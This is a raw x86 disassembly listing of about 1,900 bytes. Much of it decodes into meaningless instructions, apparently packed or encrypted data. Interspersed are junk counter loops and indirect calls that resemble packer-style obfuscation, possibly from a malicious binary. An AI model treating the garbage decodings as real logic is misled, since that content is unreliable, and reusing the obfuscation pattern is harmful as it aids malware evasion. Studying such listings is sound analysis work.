  409d05:	shr    cl,1
  409d07:	outs   dx,DWORD PTR ds:[esi]
  409d08:	jb     0x409d41
  409d0a:	cmp    ah,BYTE PTR [ecx+0x33]
  409d0d:	sbb    BYTE PTR fs:[ecx+0x7f017d03],ah
  409d14:	sbb    eax,0xd0b4c1c5
  409d19:	out    dx,eax
  409d1a:	add    al,0x54
  409d1c:	or     al,0x83
  409d1e:	cmp    BYTE PTR [edx],dl
  409d20:	dec    edi
  409d21:	cld    
  409d22:	inc    ebp
  409d23:	loope  0x409d98
  409d25:	daa    
  409d26:	pop    ecx
  409d27:	int3   
  409d28:	jmp    0x409cc6
  409d2a:	lds    eax,FWORD PTR [ecx+ecx*2]
  409d2d:	pop    ecx
  409d2e:	pop    edx
  409d2f:	out    0x3c,al
  409d31:	in     eax,dx
  409d32:	xchg   esp,eax
  409d33:	sbb    ebx,ecx
  409d35:	inc    ebp
  409d36:	arpl   WORD PTR [ecx],si
  409d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d39:	rcr    DWORD PTR [eax+0x42],1
  409d3c:	push   cs
  409d3d:	(bad)  
  409d3e:	dec    ecx
  409d3f:	or     BYTE PTR gs:[ecx-0xe071ff9],bl
  409d46:	stc    
  409d47:	mov    ds:0x31d29b51,al
  409d4c:	mov    ch,0x34
  409d4e:	push   ds
  409d4f:	les    ecx,FWORD PTR [ebx+0x9e68ed4]
  409d55:	mov    dl,0xae
  409d57:	adc    al,0x69
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	add    DWORD PTR [edx-0x2d],0xd9c0c351
  409d61:	dec    ebp
  409d62:	cli    
  409d63:	push   ss
  409d64:	push   ebx
  409d65:	cmp    eax,0x56e587d1
  409d6a:	jle    0x409d70
  409d6c:	arpl   sp,cx
  409d6e:	popa   
  409d6f:	aas    
  409d70:	mov    BYTE PTR [ebx-0x41],0x55
  409d74:	mov    ds,ebx
  409d76:	jle    0x409d27
  409d78:	xchg   esp,eax
  409d79:	and    BYTE PTR [ecx-0x51e54829],cl
  409d7f:	cld    
  409d80:	sbb    DWORD PTR [ebp-0x68fa3837],eax
  409d86:	aaa    
  409d87:	inc    ebx
  409d88:	add    bh,ah
  409d8a:	xor    al,0x0
  409d8c:	add    BYTE PTR [edi],cl
  409d8e:	test   BYTE PTR [eax+eax*1],dl
  409d91:	add    BYTE PTR [eax],al
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	cmp    eax,0x38d26e3d
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409d9b
  409dcb:	lock cdq 
  409dcd:	push   ds
  409dce:	or     DWORD PTR [edx-0x350ce64],edi
  409dd4:	sub    esi,DWORD PTR [edx]
  409dd6:	stos   BYTE PTR es:[edi],al
  409dd7:	xchg   ecx,eax
  409dd8:	hlt    
  409dd9:	stos   BYTE PTR es:[edi],al
  409dda:	(bad)  
  409ddb:	mov    DWORD PTR [edx-0x33],ecx
  409dde:	adc    dh,BYTE PTR [ecx]
  409de0:	fs ret 0x1fb9
  409de4:	or     al,0x8b
  409de6:	xchg   BYTE PTR [ecx+edi*8],bh
  409de9:	sbb    BYTE PTR [ebx-0xf],bh
  409dec:	sub    DWORD PTR [eax+0x4cec7dce],ebx
  409df2:	loopne 0x409d99
  409df4:	adc    BYTE PTR [edx+0x4b7cce04],bl
  409dfa:	mov    eax,0x564db51
  409dff:	sbb    eax,0x1e861f6c
  409e04:	das    
  409e05:	popa   
  409e06:	xchg   esi,eax
  409e07:	dec    esi
  409e08:	mov    ebx,edx
  409e0a:	or     eax,0x6e35ffa1
  409e0f:	stc    
  409e10:	cwde   
  409e11:	mov    dl,0x35
  409e13:	jb     0x409dc1
  409e15:	jmp    FWORD PTR [ecx-0x5b]
  409e18:	popf   
  409e19:	inc    ecx
  409e1a:	pop    esp
  409e1b:	ficomp DWORD PTR [ebx-0x18]
  409e1e:	aas    
  409e1f:	iret   
  409e20:	xchg   BYTE PTR [ebp-0x17],bh
  409e23:	int    0xcc
  409e25:	(bad)  
  409e26:	pop    esp
  409e27:	test   al,0xbb
  409e29:	add    eax,0x3fb0730c
  409e2e:	test   eax,0x4fe47338
  409e33:	mov    eax,0xea4dfe60
  409e38:	sub    DWORD PTR [ecx],ecx
  409e3a:	arpl   cx,si
  409e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e3d:	pushf  
  409e3e:	pop    ebp
  409e3f:	loope  0x409dd6
  409e41:	add    BYTE PTR [ecx],cl
  409e43:	clc    
  409e44:	xchg   edi,eax
  409e45:	jmp    0x409e1c
  409e47:	(bad)  
  409e48:	ja     0x409e35
  409e4a:	jge    0x409e7d
  409e4c:	cli    
  409e4d:	pop    edx
  409e4e:	xchg   esi,eax
  409e4f:	sar    BYTE PTR ss:[esi+0x5c],1
  409e53:	fwait
  409e54:	jbe    0x409e7b
  409e56:	pop    ds
  409e57:	inc    ecx
  409e58:	loopne 0x409e27
  409e5a:	xor    ebp,edx
  409e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e5d:	loope  0x409eb3
  409e5f:	inc    edi
  409e60:	fidiv  DWORD PTR [ecx+0x47]
  409e63:	popa   
  409e64:	addr16 push ds
  409e66:	fwait
  409e67:	aad    0x6e
  409e69:	sub    ecx,esp
  409e6b:	into   
  409e6c:	cld    
  409e6d:	out    0x75,eax
  409e6f:	jp     0x409ec6
  409e71:	nop
  409e72:	out    0xfd,eax
  409e74:	mov    esi,0x2b96e150
  409e79:	aaa    
  409e7a:	(bad)  
  409e7b:	cmp    ecx,eax
  409e7d:	bound  edi,QWORD PTR [esi+0x4ef8ff]
  409e83:	cmp    DWORD PTR [edx+0x35dae2c7],ebp
  409e89:	jle    0x409e7c
  409e8b:	or     al,0x5e
  409e8d:	stos   BYTE PTR es:[edi],al
  409e8e:	aad    0x4b
  409e90:	ret    
  409e91:	xor    al,0x8e
  409e93:	inc    ebx
  409e94:	pop    ds
  409e95:	dec    ebp
  409e96:	loope  0x409e20
  409e98:	push   ss
  409e99:	push   es
  409e9a:	int3   
  409e9b:	inc    esi
  409e9c:	or     ch,bl
  409e9e:	loope  0x409ee3
  409ea0:	fwait
  409ea1:	fwait
  409ea2:	das    
  409ea3:	sub    BYTE PTR [esi+0x6580212b],bh
  409ea9:	mov    edi,0xdc20e117
  409eae:	into   
  409eaf:	mov    cl,0xb4
  409eb1:	cmp    eax,0x50e2a046
  409eb6:	and    eax,0xe91c0913
  409ebb:	xor    BYTE PTR [ebx+eax*1-0x7cd4cbc1],0x12
  409ec3:	add    al,0x8d
  409ec5:	sub    al,0x6b
  409ec7:	adc    DWORD PTR [ebp+0x75bc0875],eax
  409ecd:	mov    ch,0xcc
  409ecf:	xor    ebx,ebp
  409ed1:	sbb    bl,BYTE PTR [esi+edi*8-0x306d9839]
  409ed8:	cli    
  409ed9:	sub    al,0x73
  409edb:	loope  0x409f22
  409edd:	pop    eax
  409ede:	xchg   esp,eax
  409edf:	inc    ebx
  409ee0:	retf   
  409ee1:	out    0xbe,eax
  409ee3:	jno    0x409e8a
  409ee5:	and    edi,ecx
  409ee7:	aad    0xb6
  409ee9:	pushf  
  409eea:	cmc    
  409eeb:	retf   0x891f
  409eee:	mov    WORD PTR [edi*4+0x59a3a69e],gs
  409ef5:	pop    esp
  409ef6:	jge    0x409f53
  409ef8:	es mov esp,0x93d94dc4
  409efe:	test   BYTE PTR [ebp+0x3b41ca8b],dl
  409f04:	out    0xa5,eax
  409f06:	jnp    0x409e91
  409f08:	mov    esi,0x7743f34b
  409f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f0e:	dec    esp
  409f0f:	fst    DWORD PTR [ecx-0x244e561f]
  409f15:	push   edi
  409f16:	loopne 0x409ee1
  409f18:	jp     0x409f59
  409f1a:	fisubr DWORD PTR [edx]
  409f1c:	xor    al,0xdf
  409f1e:	lea    edi,[bp+0x1f]
  409f22:	mov    dh,0x36
  409f24:	lock je 0x409f58
  409f27:	aam    0xd2
  409f29:	cli    
  409f2a:	outs   dx,DWORD PTR ds:[esi]
  409f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f2c:	nop
  409f2d:	fnstsw WORD PTR [edi+0x74]
  409f30:	xchg   BYTE PTR [ecx-0x19b05262],ah
  409f36:	mov    ecx,0x5e5529a7
  409f3b:	cs jmp 0x165a:0x6216ead7
  409f43:	and    eax,0xde7f900a
  409f48:	and    eax,0x6bd6d5bd
  409f4d:	jmp    0x25b42661
  409f52:	mov    cl,0x27
  409f54:	sbb    DWORD PTR [edx+0x15],0xbf1d857b
  409f5b:	add    eax,0x83946815
  409f60:	ja     0x409f32
  409f62:	int    0xa0
  409f64:	sbb    al,BYTE PTR [edx+0x1d]
  409f67:	sub    DWORD PTR [ebx+0x481c0517],0x55f7055c
  409f71:	dec    esp
  409f72:	xchg   ebx,eax
  409f73:	int3   
  409f74:	pop    es
  409f75:	pop    ds
  409f76:	mov    eax,ds:0xf0cd99ff
  409f7b:	jecxz  0x409f33
  409f7d:	ror    DWORD PTR [ebx+0x51e18cc1],0xfe
  409f84:	mov    esp,0xaf05ab3b
  409f89:	and    ebx,DWORD PTR [eax+0x76]
  409f8c:	inc    ebp
  409f8d:	xor    eax,0x80780a97
  409f92:	or     eax,0xd4f5c51e
  409f97:	stc    
  409f98:	mov    ds:0x4ff5756f,al
  409f9d:	mov    ds:0xa136a110,eax
  409fa2:	sub    esi,ecx
  409fa4:	and    BYTE PTR [ebp-0x53],0xa4
  409fa8:	sbb    al,0x92
  409faa:	lods   eax,DWORD PTR ds:[esi]
  409fab:	iret   
  409fac:	sub    ecx,0xffffffe8
  409faf:	shl    BYTE PTR [edi+0x6556c473],1
  409fb5:	mov    cl,0xad
  409fb7:	ins    DWORD PTR es:[edi],dx
  409fb8:	mov    esi,DWORD PTR [ebp-0x7eb5b153]
  409fbe:	or     al,BYTE PTR [esi]
  409fc0:	adc    eax,0x553d50ac
  409fc5:	sar    eax,1
  409fc7:	je     0x409f80
  409fc9:	arpl   bp,bx
  409fcb:	mov    al,0x7b
  409fcd:	out    0x7f,eax
  409fcf:	push   esi
  409fd0:	xor    ah,BYTE PTR [esi+0x50]
  409fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd4:	mov    edi,0x99821f06
  409fd9:	pop    ss
  409fda:	lahf   
  409fdb:	mov    ch,BYTE PTR [edx+0x14]
  409fde:	dec    ebx
  409fdf:	sbb    BYTE PTR [edx+0x5c],dh
  409fe2:	sub    esi,edi
  409fe4:	mov    eax,ds:0xe2975521
  409fe9:	cmp    al,0x6f
  409feb:	pusha  
  409fec:	xor    DWORD PTR [eax-0x63],ecx
  409fef:	mov    cl,0x6b
  409ff1:	outs   dx,DWORD PTR ds:[esi]
  409ff2:	cld    
  409ff3:	dec    edi
  409ff4:	fild   WORD PTR [ecx]
  409ff6:	adc    eax,0x5c4492eb
  409ffb:	jge    0x40a007
  409ffd:	push   edi
  409ffe:	(bad)  
  409fff:	mov    ebx,0xbb4258a5
  40a004:	inc    esi
  40a005:	xchg   BYTE PTR [ecx+0x30400d6a],al
  40a00b:	fisubr WORD PTR [ecx+esi*2-0x73]
  40a00f:	cld    
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	cmp    edx,edi
  40a128:	out    0x52,eax
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0f4
  40a133:	xchg   DWORD PTR ds:0x8b93bccf,ebx
  40a139:	push   ecx
  40a13a:	fs xchg esp,eax
  40a13c:	es jae 0x40a111
  40a13f:	outs   dx,BYTE PTR ds:[esi]
  40a140:	loopne 0x40a0de
  40a142:	and    eax,DWORD PTR [ebx]
  40a144:	xchg   edi,eax
  40a145:	jp     0x40a0ca
  40a147:	or     al,0xad
  40a149:	ja     0x40a19c
  40a14b:	ja     0x40a122
  40a14d:	cmc    
  40a14e:	jl     0x40a0f9
  40a150:	push   edi
  40a151:	in     al,0xc6
  40a153:	push   0xffffffde
  40a155:	int    0xd7
  40a157:	in     eax,dx
  40a158:	cs sar edi,1
  40a15b:	jb     0x40a17c
  40a15d:	cmp    al,0x17
  40a15f:	loopne 0x40a1a0
  40a161:	mov    ebp,0x69dd41a1
  40a166:	push   edx
  40a167:	xor    BYTE PTR [ebx],dl
  40a169:	inc    edi
  40a16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16b:	sub    esp,eax
  40a16d:	enter  0x80bf,0xb1
  40a171:	repz push esi
  40a173:	xchg   edi,eax
  40a174:	dec    esi
  40a175:	lock fcomi st,st(4)
  40a178:	sub    al,0x10
  40a17a:	mov    ecx,0x31a14201
  40a17f:	in     eax,0xef
  40a181:	or     edx,DWORD PTR [edx-0x1f376930]
  40a187:	mov    WORD PTR [edx],es
  40a189:	(bad)  
  40a18a:	push   edi
  40a18b:	jecxz  0x40a1b6
  40a18d:	(bad)  
  40a18e:	cmp    BYTE PTR ds:0x571d5851,bl
  40a194:	sbb    edi,DWORD PTR [si]
  40a197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a198:	pop    esi
  40a199:	adc    eax,0xfc279933
  40a19e:	cmp    dl,ch
  40a1a0:	lods   al,BYTE PTR ds:[esi]
  40a1a1:	aas    
  40a1a2:	pop    eax
  40a1a3:	pop    eax
  40a1a4:	dec    ebp
  40a1a5:	jge    0x40a1df
  40a1a7:	xor    ebp,DWORD PTR [eax+ebx*4-0x65ef80d3]
  40a1ae:	stc    
  40a1af:	xlat   BYTE PTR ds:[ebx]
  40a1b0:	popf   
  40a1b1:	dec    edi
  40a1b2:	mov    edx,0xf4ed664c
  40a1b7:	jnp    0x40a218
  40a1b9:	scas   eax,DWORD PTR es:[edi]
  40a1ba:	and    eax,DWORD PTR [ecx-0x30c8aa21]
  40a1c0:	mov    esi,0xaa8c263f
  40a1c5:	aam    0x4c
  40a1c7:	hlt    
  40a1c8:	fcom   st(4)
  40a1ca:	sub    bh,BYTE PTR [esi+0x665aecc6]
  40a1d0:	push   ds
  40a1d1:	daa    
  40a1d2:	in     al,dx
  40a1d3:	daa    
  40a1d4:	xchg   esp,eax
  40a1d5:	and    al,0x62
  40a1d7:	leave  
  40a1d8:	hlt    
  40a1d9:	fwait
  40a1da:	call   0xdc23:0x49ee6337
  40a1e1:	jns    0x40a203
  40a1e3:	push   ebp
  40a1e4:	loop   0x40a1ff
  40a1e6:	mov    eax,0x42b9663f
  40a1eb:	js     0x40a215
  40a1ed:	ja     0x40a1e3
  40a1ef:	sub    al,0xac
  40a1f1:	sub    eax,0x8b9bd3fd
  40a1f6:	das    
  40a1f7:	cwde   
  40a1f8:	test   DWORD PTR [edx+0x28],eax
  40a1fb:	cmp    BYTE PTR [edx],bl
  40a1fd:	mov    esi,0x31b3ef47
  40a202:	cmp    BYTE PTR [ecx-0x66],bl
  40a205:	cwde   
  40a206:	and    eax,edi
  40a208:	push   ss
  40a209:	pop    ds
  40a20a:	pusha  
  40a20b:	fld    DWORD PTR [ebx]
  40a20d:	cmp    BYTE PTR [edi+edx*4-0x14132ea1],al
  40a214:	push   ebx
  40a215:	test   eax,0x1682fe9f
  40a21a:	shl    ch,cl
  40a21c:	and    al,0x12
  40a21e:	lea    eax,[edi-0x2d0b421c]
  40a224:	cmp    ah,BYTE PTR [eax+0x2a]
  40a227:	repz imul sp,WORD PTR [eax+0x34311419],0xfff4
  40a230:	or     BYTE PTR [esi+edi*2-0x42],bh
  40a234:	dec    esi
  40a235:	and    al,0x2f
  40a237:	es mov ah,0x25
  40a23a:	and    ecx,edx
  40a23c:	push   esi
  40a23d:	jl     0x40a25d
  40a23f:	int    0x3
  40a241:	sub    DWORD PTR [ebx-0x5705f91d],edx
  40a247:	lds    ebp,FWORD PTR [edx+0x4d066418]
  40a24d:	gs sub eax,0xb078cca8
  40a253:	fnstcw WORD PTR [ecx-0xb]
  40a256:	std    
  40a257:	push   ecx
  40a258:	(bad)  
  40a259:	adc    ebx,esi
  40a25b:	pop    ss
  40a25c:	jge    0x40a29d
  40a25e:	in     eax,dx
  40a25f:	cli    
  40a260:	or     al,0x2f
  40a262:	pop    ebx
  40a263:	test   al,0x7
  40a265:	cmp    al,0x1f
  40a267:	jle    0x40a2aa
  40a269:	xchg   BYTE PTR [edx-0x22],ch
  40a26c:	pusha  
  40a26d:	sub    al,0x9a
  40a26f:	aaa    
  40a270:	scas   eax,DWORD PTR es:[edi]
  40a271:	push   es
  40a272:	jle    0x40a1fc
  40a274:	js     0x40a1f9
  40a276:	(bad)  
  40a277:	shr    DWORD PTR ds:0x77f0d718,0x2c
  40a27e:	sub    BYTE PTR [edx-0x5],bh
  40a281:	mov    dh,0x24
  40a283:	icebp  
  40a284:	add    esi,DWORD PTR [edx+ebp*8-0x210fcbe0]
  40a28b:	shr    BYTE PTR [ecx],0x4c
  40a28e:	fld    TBYTE PTR [ebp+0x45]
  40a291:	test   eax,0x6ecad810
  40a296:	hlt    
  40a297:	xchg   edx,eax
  40a298:	ja     0x40a272
  40a29a:	xchg   BYTE PTR [eax+ebx*8+0x54],ch
  40a29e:	cli    
  40a29f:	mov    bl,0xc3
  40a2a1:	repz bound edi,QWORD PTR [ecx+0x2cc6cb79]
  40a2a8:	mov    dh,0x9f
  40a2aa:	(bad)  
  40a2ab:	jne    0x40a32b
  40a2ad:	test   al,0x6b
  40a2af:	cmp    eax,0x15d9156f
  40a2b4:	pop    DWORD PTR [ecx-0x7fdc4abd]
  40a2ba:	xchg   edx,eax
  40a2bb:	and    ch,al
  40a2bd:	div    BYTE PTR [edx-0x5e]
  40a2c0:	inc    ebx
  40a2c1:	jne    0x40a24c
  40a2c3:	lods   eax,DWORD PTR ds:[esi]
  40a2c4:	inc    edi
  40a2c5:	loope  0x40a2ee
  40a2c7:	aas    
  40a2c8:	and    eax,0x826b3e1a
  40a2cd:	cmp    dl,BYTE PTR [edx]
  40a2cf:	mov    bl,0xbd
  40a2d1:	push   es
  40a2d2:	push   ecx
  40a2d3:	or     eax,0xce4b016e
  40a2d8:	pusha  
  40a2d9:	or     DWORD PTR [edx+0xf541109],esp
  40a2df:	add    al,al
  40a2e1:	mov    al,0x6c
  40a2e3:	data16 fst QWORD PTR [ebp+0x79]
  40a2e7:	push   eax
  40a2e8:	sar    BYTE PTR [ebx+ebp*4-0x1eef379],0xe6
  40a2f0:	jns    0x40a29b
  40a2f2:	or     al,0xf4
  40a2f4:	mov    edi,0xe80f953d
  40a2f9:	mov    BYTE PTR [edx-0xa],dh
  40a2fc:	and    edi,0xdee55475
  40a302:	dec    ebx
  40a303:	mov    dl,0xd0
  40a305:	push   edx
  40a306:	mul    esi
  40a308:	leave  
  40a309:	int3   
  40a30a:	dec    ecx
  40a30b:	test   BYTE PTR [ecx-0x30721128],ch
  40a311:	add    al,0x1f
  40a313:	sbb    al,0x7a
  40a315:	aad    0x20
  40a317:	(bad)  
  40a318:	dec    ebp
  40a319:	(bad)  
  40a31a:	jo     0x40a2b5
  40a31c:	sbb    BYTE PTR [ebp+0x74],ah
  40a31f:	pop    edi
  40a320:	call   0x6c94:0x1313a9a4
  40a327:	sub    edx,DWORD PTR [ecx+0xf]
  40a32a:	shl    DWORD PTR [edi+ecx*8-0x50d64930],1
  40a331:	jmp    0xbf935763
  40a336:	push   0xedc43fa2
  40a33b:	add    eax,0xe92e0eb9
  40a340:	sbb    bl,dl
  40a342:	call   0x463bad60
  40a347:	or     eax,0x511dbe60
  40a34c:	mov    eax,0x2d78132c
  40a351:	dec    eax
  40a352:	push   ss
  40a353:	in     al,0xed
  40a355:	mov    ecx,0x4bdfcb86
  40a35a:	push   edi
  40a35b:	cmp    eax,0xcb01f5f4
  40a360:	and    eax,0x5eb56bcd
  40a365:	outs   dx,BYTE PTR ds:[esi]
  40a366:	sbb    BYTE PTR [eax+0x526a2395],0xf4
  40a36d:	stos   DWORD PTR es:[edi],eax
  40a36e:	fdiv   DWORD PTR [ebp-0x47]
  40a371:	out    dx,al
  40a372:	cs cld 
  40a374:	pusha  
  40a375:	loopne 0x40a389
  40a377:	outs   dx,DWORD PTR ds:[esi]
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x43377b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	aad    0xd7
  40a49d:	mov    bl,0xce
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	xor    edi,DWORD PTR [eax+0x5d]
  40a4aa:	jae    0x40a512
  40a4ac:	retf   
  40a4ad:	sbb    bl,BYTE PTR [ecx+ecx*2]
  40a4b0:	or     al,0xe0
  40a4b2:	jb     0x40a4c6
  40a4b4:	xlat   BYTE PTR ds:[ebx]
  40a4b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4b6:	jmp    0x89ea:0xf7291a87
  40a4bd:	jne    0x40a4a3
  40a4bf:	cli    
  40a4c0:	cmc    
  40a4c1:	xor    eax,0x2f240752
  40a4c6:	mov    bl,0x15
  40a4c9:	xlat   BYTE PTR ds:[ebx]
  40a4ca:	fwait
  40a4cb:	jmp    DWORD PTR [ebx-0x6666314a]
  40a4d1:	adc    eax,0x39cc8aa
  40a4d6:	push   0xffffff87
  40a4d8:	test   eax,0xe23ccd96
  40a4dd:	add    BYTE PTR [eax-0x4f],dh
  40a4e0:	pop    edx
  40a4e1:	ins    BYTE PTR es:[edi],dx
  40a4e2:	push   edx
  40a4e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4e4:	or     eax,0x64081192
  40a4e9:	call   0xa3c76f9b
  40a4ee:	ret    0xa104
  40a4f1:	inc    edx
  40a4f2:	ret    0x9585
  40a4f5:	adc    ecx,DWORD PTR [ecx]
  40a4f7:	sbb    DWORD PTR [esi-0x1e],0xffffffcc
  40a4fb:	and    edx,DWORD PTR [eax+0xd]
  40a4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4ff:	add    DWORD PTR [eax-0x40d4de53],esi
  40a505:	out    0xb,eax
  40a507:	outs   dx,DWORD PTR ds:[esi]
  40a508:	pop    eax
  40a509:	test   DWORD PTR [edx-0x4996ad7e],esi
  40a50f:	inc    ebp
  40a510:	(bad)  
  40a512:	out    dx,al
  40a513:	repnz sbb cl,al
  40a516:	dec    edi
  40a517:	mov    bh,0x54
  40a519:	xchg   ebp,eax
  40a51a:	and    BYTE PTR [ebp-0x67],0x29
  40a51e:	outs   dx,DWORD PTR ds:[esi]
  40a51f:	mov    ch,0x7a
  40a521:	and    ebx,edx
  40a523:	push   ds
  40a524:	imul   esp,DWORD PTR [ecx-0x39],0x77
  40a528:	in     al,0xc6
  40a52a:	jo     0x40a4e7
  40a52c:	mov    dl,0x41
  40a52e:	sub    BYTE PTR [esi],bh
  40a530:	dec    eax
  40a531:	and    eax,0xade30904
  40a536:	jle    0x40a4c4
  40a538:	add    ch,dh
  40a53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a53b:	jae    0x40a5bb
  40a53d:	inc    ebp
  40a53e:	div    BYTE PTR fs:[ebx-0x509885ff]
  40a545:	jo     0x40a4f2
  40a547:	lock fiadd WORD PTR ds:0x847cd7db
  40a54e:	adc    DWORD PTR [eax],esi
  40a550:	es cwde 
  40a552:	xchg   edx,eax
  40a553:	repnz adc DWORD PTR fs:[ecx-0x19cbd53f],eax
  40a55b:	ret    0x62e7
  40a55e:	sbb    dh,bl
  40a560:	(bad)  
  40a561:	and    ebp,esi
  40a563:	add    al,0x6f
  40a565:	mov    eax,0x8c792a01
  40a56a:	cmp    DWORD PTR ds:0x7b9f7c07,eax
  40a570:	push   ebp
  40a571:	pop    eax
  40a572:	pop    ds
  40a573:	dec    eax
  40a574:	xchg   BYTE PTR [edi],bl
  40a576:	arpl   sp,bp
  40a578:	rcr    BYTE PTR [ecx],1
  40a57a:	rol    BYTE PTR [ebx],1
